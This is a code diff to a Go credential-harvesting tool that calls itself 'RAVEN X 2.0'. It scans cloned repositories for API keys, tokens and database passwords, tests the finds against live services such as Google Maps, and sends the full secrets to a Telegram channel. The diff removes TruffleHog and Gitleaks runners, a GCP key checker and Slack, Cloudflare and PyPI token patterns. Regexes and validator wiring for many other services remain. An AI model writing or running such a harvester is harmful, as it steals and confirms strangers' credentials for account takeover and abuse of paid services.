@@ -82,7 +82,6 @@ type Config struct {
 		Anthropic   bool `json:"anthropic"`
 		AIAll       bool `json:"ai_all"`
 		Stripe      bool `json:"stripe"`
-		GCPAPIKey   bool `json:"gcp_api_key"`
 		SendGrid    bool `json:"sendgrid"`
 		Mailgun     bool `json:"mailgun"`
 		Twilio      bool `json:"twilio"`
@@ -176,8 +175,6 @@ type AWSScanner struct {
 	SMTPFromPattern              *regexp.Regexp
 	AWSSMTPHostPattern           *regexp.Regexp
 
-	AzureSASTokenPattern   *regexp.Regexp
-	GCPAPIKeyPattern       *regexp.Regexp
 	AliyunAccessKeyPattern *regexp.Regexp
 	AliyunSecretKeyPattern *regexp.Regexp
 
@@ -186,17 +183,8 @@ type AWSScanner struct {
 	AWSSecretV2KeyPattern  *regexp.Regexp
 
 	// ── New (Wave-5) credential patterns ──────────────────────────────────
-	SlackBotTokenPattern    *regexp.Regexp
-	SlackUserTokenPattern   *regexp.Regexp
-	SlackWebhookPattern     *regexp.Regexp
-	CloudflareTokenPattern  *regexp.Regexp
-	CloudflareGlobalPattern *regexp.Regexp
-	DigitalOceanPATPattern  *regexp.Regexp
-	SentryDSNPattern        *regexp.Regexp
-	PyPITokenPattern        *regexp.Regexp
 	PostmarkAPIKeyPattern   *regexp.Regexp
 	MailjetAPIKeyPattern    *regexp.Regexp
-	AWSSNSTopicARNPattern   *regexp.Regexp
 
 	// SMTP Service Patterns
 	SocketLabsSMTPPattern   *regexp.Regexp
@@ -226,31 +214,6 @@ type AWSScanner struct {
 	TempDir        string
 
 	ProgressBar *pterm.ProgressbarPrinter
-}
-
-type TruffleHogResult struct {
-	SourceMetadata struct {
-		Data struct {
-			Commit string `json:"commit"`
-			Email  string `json:"email"`
-			File   string `json:"file"`
-		} `json:"Data"`
-		SourceDetails struct {
-			Repository string `json:"Repository"`
-		} `json:"SourceDetails"`
-	} `json:"SourceMetadata"`
-	DetectorName string `json:"DetectorName"`
-	Verified     bool   `json:"Verified"`
-	Secret       string `json:"Secret"`
-}
-
-type GitleaksResult struct {
-	Description string `json:"Description"`
-	Secret      string `json:"Secret"`
-	RuleID      string `json:"RuleID"`
-	File        string `json:"File"`
-	Commit      string `json:"Commit"`
-	Message     string `json:"Message"`
 }
 
 var base64CandidatePattern = regexp.MustCompile(`[a-zA-Z0-9+/=_-]{40,}`)
@@ -556,8 +519,6 @@ func NewAWSScanner(configPath string) *AWSScanner {
 		SMSGatewayPattern:            regexp.MustCompile(`(?i)(?P<service>twilio|vonage|aliyun|smsastral|infobip|nexmo|clickatell|talk2all).*?(?:api[_-]?key|login|username)[\s:=]+(?P<username>[A-Za-z0-9_-]+).*?(?:secret|password|token)[\s:=]+(?P<password>[A-Za-z0-9_-]+)`),
 		DBCredentialsPattern:         regexp.MustCompile(`(?i)(?P<db>mysql|maria(?:db)?|mongodb|phpmyadmin)[\s:]*://(?P<username>[a-zA-Z0-9_.+-]+):(?P<password>[^@]+)@(?P<host>[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})(?::(?P<port>\d+))?`),
 		MailValPattern:               regexp.MustCompile(`(?i)(?P<service>zerobounce|neverbounce|bouncer)[\s:=]+(?P<apikey>[A-Za-z0-9_-]{16,64})`),
-		AzureSASTokenPattern:         regexp.MustCompile(`(?i)sig=[a-zA-Z0-9%]+&se=[a-zA-Z0-9%]+&sr=[a-zA-Z]+&sp=[a-zA-Z]+&sv=[a-zA-Z0-9.]+`),
-		GCPAPIKeyPattern:             regexp.MustCompile(`AIza[0-9A-Za-z-_]{35}`),
 		AliyunAccessKeyPattern:       regexp.MustCompile(`(?i)LTAI[A-Z0-9]{16}`),
 		AliyunSecretKeyPattern:       regexp.MustCompile(`(?i)[A-Za-z0-9]{30}`),
 		AWSSecretV2KeyPattern:        regexp.MustCompile(`<td class="v">([0-9a-zA-Z\/+]{40})<\/td>`),
@@ -566,26 +527,10 @@ func NewAWSScanner(configPath string) *AWSScanner {
 		AWSSESUserPattern:      regexp.MustCompile(`\b(AKIA|ASIA)[A-Z0-9]{16}\b`),
 
 		// ── New (Wave-5) credential patterns ──────────────────────────────
-		// Slack — bot (xoxb-), user (xoxp-), legacy (xoxa-/xoxr-/xoxs-), webhooks
-		SlackBotTokenPattern:  regexp.MustCompile(`xoxb-[0-9]{10,}-[0-9]{10,}-[A-Za-z0-9]{20,}`),
-		SlackUserTokenPattern: regexp.MustCompile(`xox[parsi]-[0-9]{8,}-[0-9]{8,}-[A-Za-z0-9]{20,}`),
-		SlackWebhookPattern:   regexp.MustCompile(`https://hooks\.slack\.com/services/T[A-Z0-9]+/B[A-Z0-9]+/[A-Za-z0-9]{20,}`),
-		// Discord — bot token (3 base64 parts), webhook URLs
-		// Cloudflare — scoped tokens & legacy global keys
-		CloudflareTokenPattern:  regexp.MustCompile(`[A-Za-z0-9_-]{40}`), // narrowed via context elsewhere (Bearer + cloudflare)
-		CloudflareGlobalPattern: regexp.MustCompile(`(?i)cloudflare[^\n]*[:=]([a-f0-9]{37})`),
-		// DigitalOcean Personal Access Token
-		DigitalOceanPATPattern: regexp.MustCompile(`\bdop_v1_[a-f0-9]{64}\b`),
-		// Sentry DSN
-		SentryDSNPattern: regexp.MustCompile(`https://[a-f0-9]{32}@(?:[a-z0-9.-]+\.)?ingest\.sentry\.io/\d+`),
-		// PyPI token
-		PyPITokenPattern: regexp.MustCompile(`\bpypi-[A-Za-z0-9_-]{50,}\b`),
 		// Postmark server token (UUID-ish)
 		PostmarkAPIKeyPattern: regexp.MustCompile(`(?i)postmark[^\n]*server[^\n]*[:=]\s*([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})`),
 		// Mailjet — API key:secret pair
 		MailjetAPIKeyPattern: regexp.MustCompile(`(?i)mailjet[^\n]*(?:api[_-]?key|public)[\s:=]+([0-9a-f]{32})`),
-		// AWS SNS topic ARNs (intel — feeds the SNS limit check)
-		AWSSNSTopicARNPattern: regexp.MustCompile(`arn:aws:sns:[a-z0-9-]+:\d{12}:[A-Za-z0-9_-]+`),
 
 		// SMTP Service Patterns
 		SocketLabsSMTPPattern:   regexp.MustCompile(`smtp\.socketlabs\.com`),
@@ -2013,22 +1958,6 @@ func (a *AWSScanner) ScanRepo(token string, repo map[string]interface{}) {
 		return
 	}
 
-	var deepScanWG sync.WaitGroup
-
-	deepScanWG.Add(1)
-	go func() {
-		defer deepScanWG.Done()
-		a.ScanRepoWithTruffleHog(targetDir, fmt.Sprintf("Repo: %s (TruffleHog)", name))
-	}()
-
-	deepScanWG.Add(1)
-	go func() {
-		defer deepScanWG.Done()
-		a.ScanRepoWithGitleaks(targetDir, fmt.Sprintf("Repo: %s (GitLeaks)", name))
-	}()
-
-	deepScanWG.Wait()
-
 	// Scan files dengan kontrol goroutine yang ketat
 	var wg sync.WaitGroup
 	fileSem := make(chan struct{}, 20) // Batasi scanning file secara bersamaan
@@ -2065,214 +1994,6 @@ func (a *AWSScanner) ScanRepo(token string, repo map[string]interface{}) {
 	})
 	wg.Wait()
 	os.RemoveAll(targetDir)
-}
-
-func (a *AWSScanner) ScanRepoWithTruffleHog(repoPath, sourceInfo string) {
-	if _, err := exec.LookPath("trufflehog"); err != nil {
-		pterm.Debug.Printfln("[TRUFFLEHOG] Not found. Skipping %s.", sourceInfo)
-		return
-	}
-
-	pterm.Info.Printfln("[TRUFFLEHOG] Scanning %s for deep secrets...", sourceInfo)
-
-	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Minute)
-	defer cancel()
-
-	cmd := exec.CommandContext(ctx, "trufflehog", "--json", "--repo_path", repoPath)
-
-	var stdout bytes.Buffer
-	var stderr bytes.Buffer
-	cmd.Stdout = &stdout
-	cmd.Stderr = &stderr
-
-	if err := cmd.Run(); err != nil {
-		if ctx.Err() == context.DeadlineExceeded {
-			pterm.Debug.Printfln("[TRUFFLEHOG TIMEOUT] Scan on %s timed out.", repoPath)
-		} else {
-			pterm.Debug.Printfln("[TRUFFLEHOG ERROR] Failed to run on %s: %v. Stderr: %s", repoPath, err, stderr.String())
-		}
-		return
-	}
-
-	scanner := bufio.NewScanner(&stdout)
-	for scanner.Scan() {
-		line := scanner.Bytes()
-		var result TruffleHogResult
-
-		if err := json.Unmarshal(line, &result); err != nil {
-			pterm.Debug.Printfln("[TRUFFLEHOG PARSE ERROR] Failed to parse JSON: %v", err)
-			continue
-		}
-
-		if result.Secret != "" {
-			if _, loaded := a.KnownKeys.LoadOrStore(result.Secret, true); loaded {
-				continue
-			}
-
-			commitShort := result.SourceMetadata.Data.Commit
-			if len(commitShort) > 8 {
-				commitShort = commitShort[:8]
-			}
-
-			details := fmt.Sprintf("Detector: %s | Verified: %t | Commit: %s | File: %s",
-				result.DetectorName, result.Verified, commitShort, result.SourceMetadata.Data.File)
-
-			secretMasked := result.Secret
-			if len(secretMasked) > 20 {
-				secretMasked = secretMasked[:4] + "..." + secretMasked[len(secretMasked)-4:]
-			}
-			pterm.Success.Printfln("[💣 TRUFFLEHOG VALID] Secret: %s | %s", secretMasked, details)
-
-			a.saveIntoFile(fmt.Sprintf("%s:%s:%s", sourceInfo, result.DetectorName, result.Secret), "trufflehog_secrets.txt")
-
-			msg := fmt.Sprintf(`💣 <b>TRUFFLEHOG SECRET FOUND</b>
-━━━━━━━━━━━━━━━━━━
-🕵️ <b>Detector:</b> %s
-✅ <b>Verified:</b> %t
-🔑 <b>Secret:</b> <code>%s</code>
-🔗 <b>Source:</b> %s
-📄 <b>File:</b> %s
-📦 <b>Commit:</b> %s
-`, result.DetectorName, result.Verified, result.Secret, sourceInfo, result.SourceMetadata.Data.File, result.SourceMetadata.Data.Commit)
-			go a.sendTelegram(msg)
-		}
-	}
-}
-
-func (a *AWSScanner) ScanRepoWithGitleaks(repoPath, sourceInfo string) {
-	if _, err := exec.LookPath("gitleaks"); err != nil {
-		pterm.Debug.Printfln("[GITLEAKS] Not found. Skipping %s.", sourceInfo)
-		return
-	}
-
-	pterm.Info.Printfln("[GITLEAKS] Scanning %s for leaks...", sourceInfo)
-
-	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Minute)
-	defer cancel()
-
-	cmd := exec.CommandContext(ctx, "gitleaks", "detect", "--repo-path", repoPath, "--report-format=json", "--exit-code=0")
-
-	var stdout bytes.Buffer
-	var stderr bytes.Buffer
-	cmd.Stdout = &stdout
-	cmd.Stderr = &stderr
-
-	if err := cmd.Run(); err != nil {
-		if ctx.Err() == context.DeadlineExceeded {
-			pterm.Debug.Printfln("[GITLEAKS TIMEOUT] Scan on %s timed out.", repoPath)
-		} else if strings.Contains(stderr.String(), "no leaks found") || strings.Contains(stdout.String(), "no leaks found") {
-		} else {
-		}
-	}
-
-	var results []GitleaksResult
-	if err := json.Unmarshal(stdout.Bytes(), &results); err != nil {
-		if len(stdout.Bytes()) > 0 {
-			pterm.Debug.Printfln("[GITLEAKS PARSE ERROR] Failed to parse JSON output: %v", err)
-		}
-		return
-	}
-
-	for _, result := range results {
-		if result.Secret != "" {
-			if _, loaded := a.KnownKeys.LoadOrStore(result.Secret, true); loaded {
-				continue
-			}
-
-			commitShort := result.Commit
-			if len(commitShort) > 8 {
-				commitShort = commitShort[:8]
-			}
-
-			details := fmt.Sprintf("Rule: %s | Commit: %s | File: %s",
-				result.RuleID, commitShort, result.File)
-
-			secretMasked := result.Secret
-			if len(secretMasked) > 20 {
-				secretMasked = secretMasked[:4] + "..." + secretMasked[len(secretMasked)-4:]
-			}
-			pterm.Success.Printfln("[💣 GITLEAKS VALID] Secret: %s | %s", secretMasked, details)
-
-			a.saveIntoFile(fmt.Sprintf("%s:%s:%s", sourceInfo, result.RuleID, result.Secret), "gitleaks_secrets.txt")
-
-			msg := fmt.Sprintf(`💣 <b>GITLEAKS SECRET FOUND</b>
-━━━━━━━━━━━━━━━━━━
-🕵️ <b>Rule:</b> %s
-🔑 <b>Secret:</b> <code>%s</code>
-🔗 <b>Source:</b> %s
-📄 <b>File:</b> %s
-📦 <b>Commit:</b> %s
-`, result.RuleID, result.Secret, sourceInfo, result.File, result.Commit)
-			go a.sendTelegram(msg)
-		}
-	}
-}
-
-// Fungsi untuk mengecek validitas GCP API Key
-func (a *AWSScanner) CheckGCPKey(key, sourceURL string) bool {
-	if !a.Config.APIValidation.GCPAPIKey { // Pengecekan fitur baru
-		return false
-	}
-
-	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
-		return false
-	}
-
-	globalCounters.mu.Lock()
-	globalCounters.APIsFoundTotal++
-	globalCounters.mu.Unlock()
-
-	// Menggunakan Google Maps Static API endpoint check
-	endpoint := fmt.Sprintf("https://maps.googleapis.com/maps/api/staticmap?center=40.714%2C-73.998&zoom=12&size=400x400&key=%s", key)
-
-	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
-	defer cancel()
-
-	req, errReq := http.NewRequestWithContext(ctx, "GET", endpoint, nil)
-	if errReq != nil {
-		pterm.Debug.Printfln("[GCP ERROR] Failed to create request for %s: %v", key[:8]+"...", errReq)
-		return false
-	}
-
-	resp, err := client.Do(req)
-
-	if err == nil {
-		defer resp.Body.Close()
-
-		if resp.StatusCode == 200 || resp.StatusCode == 403 {
-			bodyBytes, _ := ioutil.ReadAll(resp.Body)
-			body := string(bodyBytes)
-
-			if resp.StatusCode == 403 && strings.Contains(body, "API not enabled") {
-				a.logValid("GCP Key", fmt.Sprintf("Key: %s | Status: LIVE (API Disabled)", key))
-				a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "valid_gcp_key.txt")
-				a.storeValidKeyLimit("GCP Key", key, "LIVE (API Disabled)")
-			} else if resp.StatusCode == 200 || (resp.StatusCode == 400 && !strings.Contains(body, "API key not valid")) {
-				a.logValid("GCP Key", fmt.Sprintf("Key: %s | Status: LIVE", key))
-				a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "valid_gcp_key.txt")
-				a.storeValidKeyLimit("GCP Key", key, "LIVE")
-			} else {
-				return false
-			}
-
-			globalCounters.mu.Lock()
-			globalCounters.APIsValidated++
-			globalCounters.mu.Unlock()
-
-			msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
-━━━━━━━━━━━━━━━━━━
-🔑 <b>GCP API KEY FOUND</b>
-
-🔑 <b>Key:</b> <code>%s</code>
-🔗 <b>Source:</b> %s
-`, key, sourceURL)
-			go a.sendTelegram(msg)
-			return true
-		} else if resp.StatusCode == 400 {
-			pterm.Debug.Printfln("[GCP Key] Key %s failed validation (400).", key[:8]+"...")
-		}
-	}
-	return false
 }
 
 // do429Retry executes req with rate-limit (HTTP 429) and transient 5xx retry handling.
@@ -3384,7 +3105,6 @@ func (a *AWSScanner) checkAndSaveKeys(text, sourceURL string) {
 		{a.MailgunAPIKeyPattern, a.Config.APIValidation.Mailgun, "Mailgun", a.CheckMailgun},
 		{a.TelnyxApiPatternInfo, a.Config.APIValidation.Telnyx, "Telnyx", a.CheckTelnyx},
 		{a.OpenAIAPIPattern, a.Config.APIValidation.OpenAI || a.Config.APIValidation.AIAll, "OpenAI", a.CheckOpenAI},
-		{a.GCPAPIKeyPattern, a.Config.APIValidation.GCPAPIKey, "GCP Key", a.CheckGCPKey},
 		{a.AnthropicPattern, a.Config.APIValidation.Anthropic || a.Config.APIValidation.AIAll, "Anthropic", a.CheckAnthropic},
 		{a.MessageBirdPattern, a.Config.APIValidation.MessageBird, "MessageBird", a.CheckMessageBird},
 		{a.BrevoAPIKeyPattern, a.Config.Features.Brevo, "Brevo", a.CheckBrevo},
@@ -3440,18 +3160,8 @@ func (a *AWSScanner) checkAndSaveKeys(text, sourceURL string) {
 		Pattern *regexp.Regexp
 		Name    string
 	}{
-		{a.AzureSASTokenPattern, "Azure SAS Token"},
-		// Wave-5 additions — pattern-only (no live API validator yet)
-		{a.SlackBotTokenPattern, "Slack Bot Token"},
-		{a.SlackUserTokenPattern, "Slack User Token"},
-		{a.SlackWebhookPattern, "Slack Webhook"},
-		{a.CloudflareGlobalPattern, "Cloudflare Global"},
-		{a.DigitalOceanPATPattern, "DigitalOcean PAT"},
-		{a.SentryDSNPattern, "Sentry DSN"},
-		{a.PyPITokenPattern, "PyPI Token"},
 		{a.PostmarkAPIKeyPattern, "Postmark Server Token"},
 		{a.MailjetAPIKeyPattern, "Mailjet API Key"},
-		{a.AWSSNSTopicARNPattern, "AWS SNS Topic ARN"},
 	}
 
 	for _, check := range nonValidatedChecks {
